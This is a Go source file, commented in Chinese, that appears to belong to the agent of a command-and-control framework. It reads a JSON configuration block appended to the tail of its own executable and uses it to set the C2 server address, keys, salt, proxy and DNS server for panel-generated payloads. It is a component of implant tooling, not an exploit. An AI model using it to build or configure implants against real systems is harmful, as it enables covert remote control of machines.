package main

// 自身文件尾部配置块解析（与 c2engine/config_block.go 对称，但**不能共用**：
// agent 是独立 Go module，服务端代码不进 agent 构建）。
//
// 布局：
//
//	<文件内容> <blob> <blobLen u32 LE> "VSCF"
//	blob = JSON {"server","vkey","salt","mode",...}
//
// 用途：面板生成的载荷在模板尾部追加该块，agent 启动时自解析，
// 从而不需要 ldflags 即可连接指定监听器（docs/STATUS.md 记为复刻端扩展）。

import (
	"encoding/binary"
	"encoding/json"
	"errors"
	"io"
	"os"
)

const embeddedConfigMagic = "VSCF"

// errNoEmbeddedConfig 表示文件里没有配置块（走 ldflags 路径）。
var errNoEmbeddedConfig = errors.New("no embedded config block")

// loadEmbeddedConfig 从自身可执行文件尾部读取配置块。
func loadEmbeddedConfig() (map[string]string, error) {
	exe, err := os.Executable()
	if err != nil {
		return nil, err
	}
	f, err := os.Open(exe)
	if err != nil {
		return nil, err
	}
	defer f.Close()

	st, err := f.Stat()
	if err != nil {
		return nil, err
	}
	size := st.Size()
	if size < 8 {
		return nil, errNoEmbeddedConfig
	}
	hdr := make([]byte, 8)
	if _, err := f.ReadAt(hdr, size-8); err != nil && err != io.EOF {
		return nil, err
	}
	if string(hdr[4:8]) != embeddedConfigMagic {
		return nil, errNoEmbeddedConfig
	}
	n := int(binary.LittleEndian.Uint32(hdr[0:4]))
	if n <= 0 || n > 64*1024 || int64(n)+8 > size {
		return nil, errNoEmbeddedConfig
	}
	blob := make([]byte, n)
	if _, err := f.ReadAt(blob, size-8-int64(n)); err != nil && err != io.EOF {
		return nil, err
	}
	var cfg map[string]string
	if err := json.Unmarshal(blob, &cfg); err != nil {
		return nil, err
	}
	return cfg, nil
}

// applyEmbeddedConfig 用配置块覆盖构建期注入值（空值不覆盖）。
func applyEmbeddedConfig(cfg map[string]string) {
	if v := cfg["server"]; v != "" {
		ServerAddr = v
	}
	if v := cfg["vkey"]; v != "" {
		VerifyKey = v
	}
	if v, ok := cfg["salt"]; ok {
		EncryptSalt = v
	}
	if v := cfg["proxy"]; v != "" {
		ProxyAddr = v
	}
	if v := cfg["dns_server"]; v != "" {
		DNSServer = v
	}
}
